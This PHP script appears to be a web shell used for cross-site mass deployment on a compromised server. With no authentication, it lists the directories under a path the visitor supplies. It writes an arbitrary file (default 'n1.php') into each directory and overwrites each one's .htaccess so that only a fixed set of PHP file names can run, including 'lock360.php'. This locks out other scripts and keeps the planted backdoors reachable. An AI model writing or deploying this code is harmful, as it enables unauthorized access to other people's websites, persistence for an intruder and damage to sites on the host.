<?php

function getAllDir($path){
    $dirs = array();
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file =='.' || $file == '..')
        {
            continue;
        }

        $file = $path ."/". $file;
        $file = str_replace("//", "/", $file);
        if(is_dir($file))
        {
            $dirs[] = $file;
        }
    }
    return $dirs;
}

function clearDir($dir)
{
    if (substr($dir,strlen($dir) -1) == "/")
    {
        $dir = substr($dir,0,strlen($dir)-1);
    }
    preg_match("/\/([^\/]+)\$/si", $dir, $matches);
    if (isset($matches[1]))
    {
        return $matches[1];
    }
    return $dir;
}


echo '<html lang="zh-cn"><head><meta charset="UTF-8"><title>跨站</title>
<style>input {margin: 10px;}</style>
</head><body><div style="margin: 0 auto; width:1100px"><div style="float: left;text-align: left;width:600px">';
echo '<form action="?ac=path" method="post">';
echo '输入: <input style="width:300px" type="text" name="path" value="" /> <br/>';
echo '<input type="submit" value="查找路径下所有目录" />';
echo '</form><br/><br/><br/><br/>';

if (isset($_GET['ac']))
{
    switch ($_GET['ac'])
    {
        case "path":

            $path = $_POST['path'];
            if(file_exists($path))
            {
                $dirs = "";
                foreach (getAllDir($path) as $item) {
                    $dirs .= $item . PHP_EOL;
                }
                echo '<textarea cols="100" rows="20" name="dirs" form="upload">' . $dirs . '</textarea> ';
                echo '<br/><form action="?ac=upload" method="post" id="upload">';
                echo '二级目录: <input style="width:300px" type="text" name="extend_path" value="" /> <br/>';
                echo '文件名: <input style="width:300px" type="text" name="file_name" value="n1.php" /> <br/>';
                echo '文件内容：<textarea cols="100" rows="20" name="file_content" form="upload"></textarea> ';
                echo '<input type="submit" value="上传文件到目录" />';
                echo '</form>';
            }
            break;
        case "upload":

            $dirs = explode("\n", $_POST['dirs']);
            $results = "";
            foreach ($dirs as $dir) {
                $dir = trim($dir);
                if ($dir == "") {
                    continue;
                }
                $extend = trim($_POST['extend_path']);
                if ($extend != "")
                {
                    $file = $dir ."/" . $extend . "/" . $_POST['file_name'];
                } else {
                    $file = $dir ."/" . $_POST['file_name'];
                }
                $file = str_replace("//", "/", $file);
                $result = file_put_contents($file, $_POST['file_content']);

                $htaccess_content = '<FilesMatch ".(py|exe|php)$">
 Order allow,deny
 Deny from all
</FilesMatch>
<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>';
                $result_htaccess = file_put_contents($dir . "/.htaccess", $htaccess_content);
                if ($result != false){
                    if ($result_htaccess == false)
                    {
                        $results .= $dir . "\t" . ".htaccess上传失败" . PHP_EOL;
                    }
                    $results .= $dir . "\t" . clearDir($dir) . "/"  . $_POST['file_name'] . PHP_EOL;
                } else {
                    $results .= $dir . "\t" . "上传失败" . PHP_EOL;
                }

            }
            echo '<textarea cols="100" rows="20" name="dirs" form="upload">'.$results.'</textarea> ';
            break;

        default:
            break;
    }

}







echo '</div></div></body></html>';
exit();
